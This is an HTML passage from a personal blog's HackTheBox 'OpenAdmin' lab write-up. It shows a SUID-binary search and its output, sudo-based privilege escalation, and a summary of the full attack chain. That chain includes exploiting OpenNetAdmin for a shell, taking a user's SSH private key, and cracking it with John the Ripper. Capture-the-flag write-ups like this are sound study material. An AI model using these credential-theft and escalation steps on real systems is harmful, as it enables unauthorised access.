+<h3 id="elevation-of-privilege"><a href="#elevation-of-privilege" class="headerlink" title="elevation of privilege"></a>elevation of privilege</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>this command always useful</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;lxc&#x2F;lxc-user-nic</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pkexec</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgidmap</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newuidmap</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;traceroute6.iputils</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;at</span><br><span class="line">&#x2F;bin&#x2F;ping</span><br><span class="line">&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;bin&#x2F;su</span><br><span class="line">&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;bin&#x2F;fusermount</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;7270&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;7270&#x2F;bin&#x2F;ping</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;7270&#x2F;bin&#x2F;ping6</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;7270&#x2F;bin&#x2F;su</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;7270&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;7270&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;7270&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;7270&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;7270&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;7270&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;7270&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;7270&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;7270&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;7270&#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;7270&#x2F;usr&#x2F;sbin&#x2F;pppd</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;bin&#x2F;ping</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;bin&#x2F;ping6</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;bin&#x2F;su</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine</span><br><span class="line">&#x2F;snap&#x2F;core&#x2F;8039&#x2F;usr&#x2F;sbin&#x2F;pppd</span><br></pre></td></tr></table></figure>
+
+<p>i have no idea what to do next until looked writeup, maybe i shoud try command below</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/at</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/fusermount</span><br></pre></td></tr></table></figure>
+
+<p>But Writeup told me what to do , so just follow me</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/05/HackTheBox-OpenAdmin-Writeup/8.jpg" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/sudo  nano /opt/priv</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/05/HackTheBox-OpenAdmin-Writeup/9.jpg" alt></p>
+<h3 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h3><p>this machine is not very hard.  simplification step</p>
+<ol>
+<li>nmap</li>
+<li>dirb , found music/  and ona/</li>
+<li>searchsploit opennetadmin</li>
+<li>got www-data shell using opennetadmin exploit </li>
+<li>information collection , [“ls config”,”ls /var/www”,”ls /var/www/internal”,”ls /etc/apache2/sites-enable”,” cat /etc/apache2/sites-enable/internal.conf”]</li>
+<li>got internal address, got <code>joanna/.ssh/id_rsa&#39;</code></li>
+<li>ssh2john.py id_rsa &gt; id_rsa.hash</li>
+<li>john –wordlist=rockyou.txt id_rsa.hash , got ssh password</li>
+<li>chmod 600 id_rsa </li>
+<li>ssh -i id_rsa <a href="mailto:joanna@10.10.10.171">joanna@10.10.10.171</a> </li>
+<li>elevation of privilege (find / -perm -u=s -type f 2&gt;/dev/null)</li>
+<li>sudo nano /opt/priv</li>
+</ol>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>M1nzhi</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://yoursite.com/2020/04/05/HackTheBox-OpenAdmin-Writeup/">http://yoursite.com/2020/04/05/HackTheBox-OpenAdmin-Writeup/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/HackTheBox/"># HackTheBox</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/04/16/HackTheBox-ServMon-Writeup/">HackTheBox ServMon Writeup</a>
+            
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© M1nzhi | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
